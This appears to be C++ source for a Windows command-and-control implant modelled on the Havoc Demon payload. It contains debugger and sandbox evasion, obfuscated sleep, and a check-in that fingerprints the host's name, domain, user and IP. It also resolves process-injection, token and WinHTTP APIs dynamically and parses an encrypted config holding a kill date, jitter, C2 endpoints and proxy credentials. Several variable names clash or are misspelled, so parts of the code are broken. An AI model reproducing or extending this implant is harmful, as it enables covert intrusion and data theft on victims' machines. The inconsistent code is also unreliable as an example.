#include <core/include/base.hpp>

VOID Entrypoint() {
	if (!CheckSystem() || !EnumSystem()) {
		return;
	}

	ParseConfig();
    MainRoutine();
}

namespace Main {
    UINT8 DATA_SXN Config[CONFIG_SIZE] = { 0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa, };

    VOID MainRoutine() {
        static int retry = 0;
        do {
            if (!ObfuscateSleep(nullptr, nullptr) || !RuntimeChecks()) {
                break;
            }
            if (!CheckTime()) {
                continue;
            }
            if (!Ctx->Session.CheckIn && !ctx->transport.message_queue) {
                if (!EnumSystem()) {
                    break;
                }
            }

            if (!DispatchRoutine()) {
                retry++;

                if (retry == ctx->session.retries) {
                    break;
                }
                continue;
            }

            retry = 0;
        }
        while (ntstatus != ERROR_EXIT);
        ContextDestroy();
    }

	BOOL CheckSystem() {
		Ctx->Module.ntdll 		= FindModuleAddress(NTDLL);
		Ctx->Module.Kernel32 	= FindModuleAddress(KERNEL32);

		if (!Ctx->Module.Ntdll || !Ctx->Module.Kernel32) {
			return false;
		}
		Ctx->Win32.RtlGetVersion = 	FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLGETVERSION);
		Ctx->Win32.IsWow64Process = FindExportAddress((LPVOID)Ctx->Module.Kernel32, ISWOW64PROCESS);

		// NOTE: Get version and check for dbg and sandbox
        OSVERSIONINFOW osVersion = { };
        BOOL success = false;

        if (!NT_SUCCESS(Ctx->Win32.RtlGetVersion(&os_version))) {
			return false;
		}

        Ctx->Session.Version = WIN_VERSION_UNKNOWN;
        osVersion.dwOSVersionInfoSize = sizeof(osVersion);

        if (osVersion.dwMajorVersion >= 5) {
            if (osVersion.dwMajorVersion == 5) {
                if (osVersion.dwMinorVersion == 1) {
                    Ctx->Session.Version = WIN_VERSION_XP;
                }
            }
            else if (osVersion.dwMajorVersion == 6) {
                if (osVersion.dwMinorVersion == 0) {
                    Ctx->Session.Version = WIN_VERSION_2008;
                }
                else if (osVersion.dwMinorVersion == 1) {
                    Ctx->Session.Version = WIN_VERSION_2008_R2;
                }
                else if (osVersion.dwMinorVersion == 2) {
                    Ctx->Session.Version = WIN_VERSION_2012;
                }
                else if (osVersion.dwMinorVersion == 3) {
                    Ctx->Session.Version = WIN_VERSION_2012_R2;
                }
            } else if (osVersion.dwMajorVersion == 10) {
                if (osVersion.dwMinorVersion == 0) {
                    Ctx->Session.Version = WIN_VERSION_2016_X;
                }
            }
        }
		if (!Opsec::CheckDebugger() || !Opsec::CheckSandbox()) {
			return false;
		}
	}

    BOOL EnumSystem() {
        // resolve version : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
		BOOL success = false;
        PACKET *outPack = CreatePacketWithHeaders(TypeCheckin);

        IP_ADAPTER_INFO adapter = { };
        CHAR buffer[MAX_PATH] 	= { };
        DWORD nameLen 			= MAX_PATH;

        PROCESSENTRY32 procEntry   = { };
        procEntry.dwSize           = sizeof(PROCESSENTRY32);

		Ctx->Win32.GetComputerNameExA = FindExportAddress((LPVOID)Ctx->Mdoue.Kernel32, GETCOMPUTERNAMEEXA);

        if (Ctx->Win32.GetComputerNameExA(ComputerNameNetBIOS, (LPSTR)buffer, &nameLen)) {
            if (Ctx->Config.Hostname[0]) {
                if (MbsBoundCompare(buffer, Ctx->Config.Hostname, MbsLength(Ctx->Config.Hostname)) != 0) {
                    // LOG ERROR (bad host)
                    goto defer;
                }
            }
            PackString(outPack, buffer);
        } else {
            PackUint32(outPack, 0);
        }

        MemSet(buffer, 0, MAX_PATH);
        nameLen = MAX_PATH;

        if (Ctx->Win32.GetComputerNameExA(ComputerNameDnsDomain, (LPSTR)buffer, &nameLen)) {
            if (Ctx->Transport.Domain[0]) {
                if (MbsBoundCompare(Ctx->Transport.Domain, buffer, MbsLength(Ctx->Transport.Domain)) != 0) {
                    // LOG ERROR (bad domain)
                    goto defer;
                }
            }
            PackString(outPack, buffer);
        } else {
            PackUint32(outPack, 0);
        }

        MemSet(buffer, 0, MAX_PATH);
        nameLen = MAX_PATH;

		// NOTE: Beyond this point we can start capturing info.
		Ctx->Module.Iphlpapi = LoadLibrary(IPHLPAPI); // TODO: need to fix library loader.
		if (!Ctx->Module.Iphlpapi) {
			goto defer;
		}

		Ctx->Win32.GetUserNameA = FindExportAddress((LPVOID)Ctx->Module.Kernel32, GETUSERNAMEA);
		Ctx->Win32.GetAdaptersInfo = FindExportAddress((LPVOID)Ctx->Module.Iphlpapi, GETADAPTERSINFO);

        if (Ctx->Win32.GetUserNameA((LPSTR)buffer, &nameLen)) {
            PackString(outPack, buffer);
        } else {
            PackUint32(outPack, 0);
        }

        MemSet(buffer, 0, MAX_PATH);
        nameLen = sizeof(IP_ADAPTER_INFO);

        if (Ctx->Win32.GetAdaptersInfo(&adapter, &name_len) == NO_ERROR) {
            PackString(outPack, adapter.IpAddressList.IpAddress.String);
        } else {
            PackUint32(outPack, 0);
        }

        MemSet(&adapter, 0, sizeof(IP_ADAPTER_INFO));
        success = true;
defer:
        success 
			? MessageQueue(outPack) 
			: DestroyPacket(outPack);

        return success;
    }

	VOID ResolveApi() {
        // TODO: create separate ResolveApi for loader and payload
		Ctx->Module.Kernbase 	= LoadLibrary(KERNELBASE);
		Ctx->Module.Advapi 		= LoadLibrary(ADVAPI);
		Ctx->Module.Crypt32 	= LoadLibrary(CRYPT32);
		Ctx->Module.Iphlpapi 	= LoadLibrary(IPHLPAPI);
		Ctx->Module.Winhttp 	= LoadLibrary(WINHTTP);
		Ctx->Module.Mscoree 	= LoadLibrary(MSCOREE);

		Ctx->Win32.NtOpenProcess= 							FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTOPENPROCESS);
		Ctx->Win32.NtCreateUserProcess= 					FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTCREATEUSERPROCESS);
		Ctx->Win32.NtTerminateProcess= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTTERMINATEPROCESS);
		Ctx->Win32.RtlCreateProcessParametersEx= 			FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLCREATEPROCESSPARAMETERSEX);
		Ctx->Win32.RtlDestroyProcessParameters= 			FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLDESTROYPROCESSPARAMETERS);
		Ctx->Win32.NtOpenProcessToken= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTOPENPROCESSTOKEN);
		Ctx->Win32.NtOpenThreadToken= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTOPENTHREADTOKEN);
		Ctx->Win32.NtDuplicateToken= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTDUPLICATETOKEN);
		Ctx->Win32.NtDuplicateObject= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTDUPLICATEOBJECT);
		Ctx->Win32.NtQueryInformationToken= 				FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTQUERYINFORMATIONTOKEN);
		Ctx->Win32.NtQueryInformationProcess= 				FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTQUERYINFORMATIONPROCESS);
		Ctx->Win32.NtFreeVirtualMemory= 					FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTFREEVIRTUALMEMORY);
		Ctx->Win32.NtAllocateVirtualMemory= 				FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTALLOCATEVIRTUALMEMORY);
		Ctx->Win32.NtProtectVirtualMemory= 					FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTPROTECTVIRTUALMEMORY);
		Ctx->Win32.NtReadVirtualMemory= 					FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTREADVIRTUALMEMORY);
		Ctx->Win32.NtWriteVirtualMemory= 					FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTWRITEVIRTUALMEMORY);
		Ctx->Win32.NtQueryVirtualMemory= 					FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTQUERYVIRTUALMEMORY);
		Ctx->Win32.NtCreateSection= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTCREATESECTION);
		Ctx->Win32.NtMapViewOfSection= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTMAPVIEWOFSECTION);
		Ctx->Win32.NtUnmapViewOfSection= 					FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTUNMAPVIEWOFSECTION);
		Ctx->Win32.RtlAddVectoredExceptionHandler= 			FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLADDVECTOREDEXCEPTIONHANDLER);
		Ctx->Win32.RtlRemoveVectoredExceptionHandler= 		FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLREMOVEVECTOREDEXCEPTIONHANDLER);
		Ctx->Win32.RtlCreateHeap= 							FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLCREATEHEAP);
		Ctx->Win32.RtlAllocateHeap= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLALLOCATEHEAP);
		Ctx->Win32.RtlReAllocateHeap= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLREALLOCATEHEAP);
		Ctx->Win32.RtlFreeHeap= 							FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLFREEHEAP);
		Ctx->Win32.RtlDestroyHeap= 							FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLDESTROYHEAP);
		Ctx->Win32.RtlRbInsertNodeEx= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLRBINSERTNODEEX);
		Ctx->Win32.NtQuerySystemInformation= 				FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTQUERYSYSTEMINFORMATION);
		Ctx->Win32.NtQuerySystemTime= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTQUERYSYSTEMTIME);
		Ctx->Win32.NtCreateThreadEx= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTCREATETHREADEX);
		Ctx->Win32.NtOpenThread= 							FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTOPENTHREAD);
		Ctx->Win32.NtTerminateThread= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTTERMINATETHREAD);
		Ctx->Win32.NtResumeThread= 							FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTRESUMETHREAD);
		Ctx->Win32.NtGetContextThread= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTGETCONTEXTTHREAD);
		Ctx->Win32.NtSetContextThread= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTSETCONTEXTTHREAD);
		Ctx->Win32.NtSetInformationThread= 					FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTSETINFORMATIONTHREAD);
		Ctx->Win32.NtTestAlert= 							FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTTESTALERT);
		Ctx->Win32.NtDelayExecution= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTDELAYEXECUTION);
		Ctx->Win32.NtCreateEvent= 							FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTCREATEEVENT);
		Ctx->Win32.NtQueueApcThread= 						FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTQUEUEAPCTHREAD);
		Ctx->Win32.NtAlertResumeThread= 					FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTALERTRESUMETHREAD);
		Ctx->Win32.NtWaitForSingleObject= 					FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTWAITFORSINGLEOBJECT);
		Ctx->Win32.NtSignalAndWaitForSingleObject= 			FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTSIGNALANDWAITFORSINGLEOBJECT);
		Ctx->Win32.NtContinue= 								FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTCONTINUE);
		Ctx->Win32.RtlInitUnicodeString= 					FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLINITUNICODESTRING);
		Ctx->Win32.RtlHashUnicodeString= 					FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLHASHUNICODESTRING);
		Ctx->Win32.RtlRandomEx= 							FindExportAddress((LPVOID)Ctx->Module.Ntdll, RTLRANDOMEX);
		Ctx->Win32.NtClose= 								FindExportAddress((LPVOID)Ctx->Module.Ntdll, NTCLOSE);

		Ctx->Win32.FlushInstructionCache=                  	FindExportAddress((LPVOID)Ctx->Module.Kernel32, FLUSHINSTRUCTIONCACHE);
		Ctx->Win32.IsBadReadPtr=                           	FindExportAddress((LPVOID)Ctx->Module.Kernel32, ISBADREADPTR);
		Ctx->Win32.DeviceIoControl=                        	FindExportAddress((LPVOID)Ctx->Module.Kernel32, DEVICEIOCONTROL);
		Ctx->Win32.FileTimeToSystemTime= 					FindExportAddress((LPVOID)Ctx->Module.Kernel32, FILETIMETOSYSTEMTIME);
		Ctx->Win32.GetCurrentDirectoryA= 					FindExportAddress((LPVOID)Ctx->Module.Kernel32, GETCURRENTDIRECTORYA);
		Ctx->Win32.SystemTimeToTzSpecificLocalTime= 		FindExportAddress((LPVOID)Ctx->Module.Kernel32, SYSTEMTIMETOTZSPECIFICLOCALTIME);
		Ctx->Win32.GetFileAttributesW= 						FindExportAddress((LPVOID)Ctx->Module.Kernel32, GETFILEATTRIBUTESW);
		Ctx->Win32.CreateFileW= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, CREATEFILEW);
		Ctx->Win32.FindFirstFileA= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, FINDFIRSTFILEA);
		Ctx->Win32.FindFirstFileW= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, FINDFIRSTFILEW);
		Ctx->Win32.FindNextFileA= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, FINDNEXTFILEA);
		Ctx->Win32.FindNextFileW= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, FINDNEXTFILEW);
		Ctx->Win32.FindClose= 								FindExportAddress((LPVOID)Ctx->Module.Kernel32, FINDCLOSE);
		Ctx->Win32.GetFileSize= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, GETFILESIZE);
		Ctx->Win32.ReadFile= 								FindExportAddress((LPVOID)Ctx->Module.Kernel32, READFILE);
		Ctx->Win32.CallNamedPipeW= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, CALLNAMEDPIPEW);
		Ctx->Win32.CreateNamedPipeW= 						FindExportAddress((LPVOID)Ctx->Module.Kernel32, CREATENAMEDPIPEW);
		Ctx->Win32.WaitNamedPipeW= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, WAITNAMEDPIPEW);
		Ctx->Win32.SetNamedPipeHandleState= 				FindExportAddress((LPVOID)Ctx->Module.Kernel32, SETNAMEDPIPEHANDLESTATE);
		Ctx->Win32.ConnectNamedPipe= 						FindExportAddress((LPVOID)Ctx->Module.Kernel32, CONNECTNAMEDPIPE);
		Ctx->Win32.TransactNamedPipe= 						FindExportAddress((LPVOID)Ctx->Module.Kernel32, TRANSACTNAMEDPIPE);
		Ctx->Win32.DisconnectNamedPipe= 					FindExportAddress((LPVOID)Ctx->Module.Kernel32, DISCONNECTNAMEDPIPE);
		Ctx->Win32.PeekNamedPipe= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, PEEKNAMEDPIPE);
		Ctx->Win32.GetProcAddress= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, GETPROCADDRESS);
		Ctx->Win32.GetModuleHandleA= 						FindExportAddress((LPVOID)Ctx->Module.Kernel32, GETMODULEHANDLEA);
		Ctx->Win32.LoadLibraryA= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, LOADLIBRARYA);
		Ctx->Win32.FreeLibrary= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, FREELIBRARY);
		Ctx->Win32.CreateToolhelp32Snapshot= 				FindExportAddress((LPVOID)Ctx->Module.Kernel32, CREATETOOLHELP32SNAPSHOT);
		Ctx->Win32.Process32First= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, PROCESS32FIRST);
		Ctx->Win32.Process32Next= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, PROCESS32NEXT);
		Ctx->Win32.GlobalMemoryStatusEx= 					FindExportAddress((LPVOID)Ctx->Module.Kernel32, GLOBALMEMORYSTATUSEX);
		Ctx->Win32.SleepEx= 								FindExportAddress((LPVOID)Ctx->Module.Kernel32, SLEEPEX);
    	Ctx->Win32.FindResourceA= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, FINDRESOURCEA);
		Ctx->Win32.LoadResource= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, LOADRESOURCE);
		Ctx->Win32.LockResource= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, LOCKRESOURCE);
		Ctx->Win32.SizeofResource= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, SIZEOFRESOURCE);
		Ctx->Win32.FreeResource= 							FindExportAddress((LPVOID)Ctx->Module.Kernel32, FREERESOURCE);
		Ctx->Win32.SetProcessValidCallTargets= 				FindExportAddress((LPVOID)Ctx->Modules.Kernbase, SETPROCESSVALIDCALLTARGETS);

		Ctx->Win32.LookupAccountSidW= 						FindExportAddress((LPVOID)Ctx->Module.Advapi, LOOKUPACCOUNTSIDW);
		Ctx->Win32.LookupPrivilegeValueA= 					FindExportAddress((LPVOID)Ctx->Module.Advapi, LOOKUPPRIVILEGEVALUEA);
		Ctx->Win32.AddMandatoryAce= 						FindExportAddress((LPVOID)Ctx->Module.Advapi, ADDMANDATORYACE);
		Ctx->Win32.SetEntriesInAclA= 						FindExportAddress((LPVOID)Ctx->Module.Advapi, SETENTRIESINACLA);
		Ctx->Win32.AllocateAndInitializeSid= 				FindExportAddress((LPVOID)Ctx->Module.Advapi, ALLOCATEANDINITIALIZESID);
		Ctx->Win32.InitializeSecurityDescriptor= 			FindExportAddress((LPVOID)Ctx->Module.Advapi, INITIALIZESECURITYDESCRIPTOR);
		Ctx->Win32.SetSecurityDescriptorDacl= 				FindExportAddress((LPVOID)Ctx->Module.Advapi, SETSECURITYDESCRIPTORDACL);
		Ctx->Win32.SetSecurityDescriptorSacl= 				FindExportAddress((LPVOID)Ctx->Module.Advapi, SETSECURITYDESCRIPTORSACL);
		Ctx->Win32.InitializeAcl= 							FindExportAddress((LPVOID)Ctx->Module.Advapi, INITIALIZEACL);
		Ctx->Win32.FreeSid= 								FindExportAddress((LPVOID)Ctx->Module.Advapi, FREESID);
		Ctx->Win32.ImpersonateLoggedOnUser= 				FindExportAddress((LPVOID)Ctx->Module.Advapi, IMPERSONATELOGGEDONUSER);
		Ctx->Win32.AdjustTokenPrivileges= 					FindExportAddress((LPVOID)Ctx->Module.Advapi, ADJUSTTOKENPRIVILEGES);
		Ctx->Win32.RegOpenKeyExA= 							FindExportAddress((LPVOID)Ctx->Module.Advapi, REGOPENKEYEXA);
		Ctx->Win32.RegCreateKeyExA= 						FindExportAddress((LPVOID)Ctx->Module.Advapi, REGCREATEKEYEXA);
		Ctx->Win32.RegSetValueExA= 							FindExportAddress((LPVOID)Ctx->Module.Advapi, REGSETVALUEEXA);
		Ctx->Win32.RegCloseKey= 							FindExportAddress((LPVOID)Ctx->Module.Advapi, REGCLOSEKEY);
		Ctx->Win32.CLRCreateInstance= 						FindExportAddress((LPVOID)Ctx->Module.Mscoree, CLRCREATEINSTANCE);
		Ctx->Win32.WinHttpOpen= 							FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPOPEN);
		Ctx->Win32.WinHttpConnect= 					    	FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPCONNECT);
		Ctx->Win32.WinHttpOpenRequest= 						FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPOPENREQUEST);
		Ctx->Win32.WinHttpAddRequestHeaders= 				FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPADDREQUESTHEADERS);
		Ctx->Win32.WinHttpSetOption= 						FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPSETOPTION);
		Ctx->Win32.WinHttpGetProxyForUrl= 					FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPGETPROXYFORURL);
		Ctx->Win32.WinHttpGetIEProxyConfigForCurrentUser= 	FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPGETIEPROXYCONFIGFORCURRENTUSER);
		Ctx->Win32.WinHttpSendRequest= 						FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPSENDREQUEST);
		Ctx->Win32.WinHttpReceiveResponse= 					FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPRECEIVERESPONSE);
		Ctx->Win32.WinHttpReadData= 						FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPREADDATA);
		Ctx->Win32.WinHttpQueryHeaders= 					FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPQUERYHEADERS);
		Ctx->Win32.WinHttpQueryDataAvailable= 				FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPQUERYDATAAVAILABLE);
		Ctx->Win32.WinHttpCloseHandle= 						FindExportAddress((LPVOID)Ctx->Module.Winhttp, WINHTTPCLOSEHANDLE);
		Ctx->Win32.CryptStringToBinaryA= 					FindExportAddress((LPVOID)Ctx->Module.Crypt32, CRYPTSTRINGTOBINARYA);
		Ctx->Win32.CryptBinaryToStringA= 					FindExportAddress((LPVOID)Ctx->Module.Crypt32, CRYPTBINARYTOSTRINGA);
	}

    VOID ParseConfig() {
        PARSER parser = { };

        CreateParser(&parser, Config, sizeof(Config));
        MemSet(Config, 0, sizeof(Config));

        Ctx->Transport.PacketCache  = nullptr;
        ctx->session.NodeId			= UnpackUint32(&parser);

        ParserMemcpy(&parser, &Ctx->Config.SessionKey, nullptr);

        if (ENCRYPTED) {
            XteaCrypt(B_PTR(parser.buffer), parser.length, Ctx->Config.SessionKey, false);
        }

        ParserStrcpy(&parser, &Ctx->Config.Hostname, nullptr);

        Ctx->Session.Retries        = UnpackUint32(&parser);
        Ctx->Config.WorkingHours   	= UnpackUint32(&parser);
        Ctx->Config.Killdate		= UnpackUint64(&parser);
        Ctx->Config.Sleeptime       = UnpackUint32(&parser);
        Ctx->Config.Jitter          = UnpackUint32(&parser);

#ifdef TRANSPORT_HTTP
        Ctx->Transport.Http = (_http_context*) Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, sizeof(HTTP));

        Ctx->Transport.Http->hInternet     = nullptr;
        Ctx->Transport.Http->Endpoints  = nullptr;
        Ctx->Transport.Http->Headers    = nullptr;

        ParserWcscpy(&parser, &Ctx->Transport.Http->Useragent, nullptr);
        ParserWcscpy(&parser, &Ctx->Transport.Http->Address, nullptr  );
        Ctx->Transport.Http->Port = (INT) UnpackUint32(&parser);
        ParserStrcpy(&parser, &Ctx->Transport.Domain, nullptr);

        ctx->transport.http->nEndpoints = UnpackUint32(&parser);
        ctx->transport.http->endpoints  = (WCHAR**) Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, sizeof(WCHAR*) * ((ctx->transport.http->nEndpoints + 1)));

        for (auto i = 0; i < Ctx->Transport.Http->nEndpoints; i++) {
            ParserWcscpy(&parser, &Ctx->Transport.Http->Endpoints[i], nullptr);
        }

        Ctx->Transport.Http->Endpoints[Ctx->Transport.Http->nEndpoints] = nullptr;
        Ctx->Transport.bProxy = UnpackBool(&parser);

        if (Ctx->Transport.bProxy) {
            Ctx->transport.Http->Proxy = (PROXY*) Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, sizeof(PROXY));
            Ctx->transport.Http->Access = INTERNET_OPEN_TYPE_PROXY;

            ParserWcscpy(&parser, &Ctx->Transport.Http->Proxy->Address, nullptr );
            ParserWcscpy(&parser, &Ctx->Transport.Http->Proxy->Username, nullptr );
            ParserWcscpy(&parser, &Ctx->Transport.Http->Proxy->Password, nullptr );
        }
#endif
#ifdef TRANSPORT_PIPE
        ParserWcscpy(&parser, &Ctx->Transport.PipeName, nullptr);
#endif
        DestroyParser(&parser);
    }
}

